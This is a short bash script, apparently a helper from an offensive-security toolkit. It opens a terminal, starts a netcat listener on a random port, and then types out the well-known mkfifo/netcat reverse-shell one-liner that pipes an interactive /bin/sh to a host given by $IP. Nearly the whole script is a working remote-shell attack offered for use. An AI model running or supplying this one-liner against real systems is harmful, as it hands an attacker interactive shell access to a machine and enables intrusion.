#!/bin/bash

source "/opt/Symbian/functions.sh"

PORT=$(($RANDOM+3000))

hide_guake
terminator
sleep 0.5
call_cmd "nc -lnvp $PORT"
alt_tab
sleep 0.5
call_cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"